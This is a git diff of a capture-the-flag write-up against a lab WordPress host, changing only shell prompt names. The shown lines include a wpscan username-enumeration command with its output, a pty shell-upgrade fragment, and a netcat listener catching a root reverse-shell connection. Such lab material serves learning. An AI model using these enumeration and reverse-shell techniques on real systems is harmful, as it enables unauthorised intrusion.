@@ -17,7 +17,7 @@ Muahahaha now we know that the blog is run by wordpress. there is a powerful too
 
 The Idea is we will use wpscan to enumerate username and the we can brute force the password using wordlist on our kali. to enumerate username, run:
 ```console
-kali@kali:~$ wpscan --url http://jack.thm --enumerate u
+bibo318@parrot:~$ wpscan --url http://jack.thm --enumerate u
 i] User(s) Identified:
 
 [+] jack
@@ -162,7 +162,7 @@ pty.spawn("/bin/bash")
 ```
 now on ur kali
 ```console
-kali@kali:~/script$ nc -nlvp 9696
+bibo318@parrot:~/script$ nc -nlvp 9696
 listening on [any] 9696 ...
 connect to [10.11.14.220] from (UNKNOWN) [10.10.93.28] 40908
 root@jack:~# ls
